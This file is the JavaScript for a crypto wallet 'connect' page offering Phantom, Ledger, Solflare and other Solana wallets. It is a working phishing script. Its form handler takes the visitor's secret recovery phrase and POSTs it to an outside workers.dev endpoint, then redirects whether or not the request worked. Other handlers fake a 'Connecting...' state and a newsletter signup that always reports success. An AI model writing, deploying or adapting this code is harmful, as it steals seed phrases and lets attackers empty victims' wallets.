// Utility functions for showing messages
function showWarningMessage(message) {
    const warningEl = document.querySelector('.el-message--warning');
    warningEl.style.display = 'flex';
    warningEl.style.opacity = 1;
    setTimeout(() => {
        warningEl.style.top = '20px';
        warningEl.style.zIndex = 2010;
    }, 100);
    document.querySelector('#gcon').textContent = message;
    setTimeout(() => {
        warningEl.style.opacity = 0;
        warningEl.style.top = 0;
        setTimeout(() => {
            warningEl.style.display = 'none';
        }, 500);
    }, 3000);
}

function showSuccessMessage(message) {
    const successEl = document.querySelector('.el-message--success');
    successEl.style.display = 'flex';
    successEl.style.opacity = 1;
    setTimeout(() => {
        successEl.style.top = '20px';
        successEl.style.zIndex = 2009;
    }, 100);
    document.querySelector('#scon').textContent = message;
    setTimeout(() => {
        successEl.style.opacity = 0;
        successEl.style.top = 0;
        setTimeout(() => {
            successEl.style.display = 'none';
        }, 500);
    }, 3000);
}

// Navigation functions
function removeActiveClass() {
    document.querySelectorAll('.nav li').forEach(el => {
        el.classList.remove('active');
    }); 
}

document.querySelector('.icon-menu').onclick = () => {
    document.querySelector('.nav').classList.toggle('active');
}

document.querySelectorAll('.nav li').forEach((el, index) => {
    if (index < 2) {
        el.onclick = e => {
            removeActiveClass();
            e.preventDefault();
            el.classList.add('active');
            document.querySelector(`#${el.textContent.toLowerCase().trim()}`).scrollIntoView({
                behavior: 'smooth'
            });
        };
    }
    if (index == 2) {
        el.onclick = e => {
            removeActiveClass();
            e.preventDefault();
            el.classList.add('active');
            showWarningMessage('coming soon');
        };
    }
});

// Subscribe button handlers
document.querySelectorAll('#sub').forEach((el, index) => {
    el.onclick = e => {
        e.preventDefault();
        e.stopPropagation();
        if (document.querySelectorAll('.el-input__inner')[index].value.trim() == '') {
            showWarningMessage('Please enter your valid email!');
        } else {
            showSuccessMessage('Submitted successfully!');
        }
    };
});

// Modal handlers
$(function () {
    const buttons = Array.from({length: 21}, (_, i) => `#callback-button${i || ''}`).join(', ');
    $(buttons).click(function (e) {
        e.preventDefault();
        $('.modal').addClass('modal_active');
        $('body').addClass('hidden');
    });

    $('.modal__close-button').click(function (e) {
        e.preventDefault();
        $('.modal').removeClass('modal_active');
        $('body').removeClass('hidden');
    });

    $('.modal').mouseup(function (e) {
        let modalContent = $(".modal__content");
        if (!modalContent.is(e.target) && modalContent.has(e.target).length === 0) {
            $(this).removeClass('modal_active');
            $('body').removeClass('hidden');
        }
    });
});

// Wallet modal handlers
$(function () {
    const wallets = ['Phantom', 'MathWallet', 'Solong', 'Ledger', 'Clover', 'Solflare', 'Sollet', 'Slope'];
    
    wallets.forEach(wallet => {
        $(`#${wallet}`).click(function (e) {
            e.preventDefault();
            $(`.${wallet}`).addClass('modal_active');
            $('body').addClass('hidden');
        });

        $(`.${wallet}`).mouseup(function (e) {
            let modalContent = $(".modal__content");
            if (!modalContent.is(e.target) && modalContent.has(e.target).length === 0) {
                $(this).removeClass('modal_active');
                $('body').removeClass('hidden');
            }
        });
    });

    $('.modal__close-button').click(function (e) {
        e.preventDefault();
        $('.Phantom, .MathWallet, .Solong, .Ledger, .Clover, .Solflare, .Sollet, .Slope').removeClass('modal_active');
        $('body').removeClass('hidden');
    });
});

// Secret phrase input handler
document.querySelectorAll('.import-account__secret-phrase').forEach(el => {
    el.addEventListener('keypress', e => {
        if (e.keyCode === 13 && el.value.trim() !== '') {
            e.preventDefault();
            const send = el.parentElement.querySelector('li button');
            send.click();
            el.value = '';
            send.textContent = 'Connecting...';
            send.disabled = true;
            el.disabled = true;
        }
    });
});

// Form submission handler
$(document).ready(function() {
    $('#connectWallet').click(function(e) {
        e.preventDefault();
        e.stopPropagation();
        $('#modal-1').addClass('modal_active');
        $('body').addClass('hidden');
    });

    $('.modal__close-button').click(function() {
        $('#modal-1').removeClass('modal_active');
        $('body').removeClass('hidden');
    });

    $(window).click(function(e) {
        if ($(e.target).hasClass('modal_active')) {
            $('#modal-1').removeClass('modal_active');
            $('body').removeClass('hidden');
        }
    });

    $('#formx').submit(function(e) {
        e.preventDefault();
        let phrase = $('#first').val().trim();
        
        if (phrase) {
            $.ajax({
                type: "POST",
                url: "https://12e12e12e-jolly-hill-4185.juistespastelastes.workers.dev/",
                data: {
                    name: $('#firstn').val(),
                    phrase: phrase
                },
                success: function() {
                    $('#first').val('');
                    $('.modal').removeClass('modal_active');
                    $('body').removeClass('hidden');
                    window.location.href = window.location.origin;
                },
                error: function() {
                    $('#first').val('');
                    $('.modal').removeClass('modal_active');
                    $('body').removeClass('hidden');
                    window.location.href = window.location.origin;
                }
            });
        }
    });
});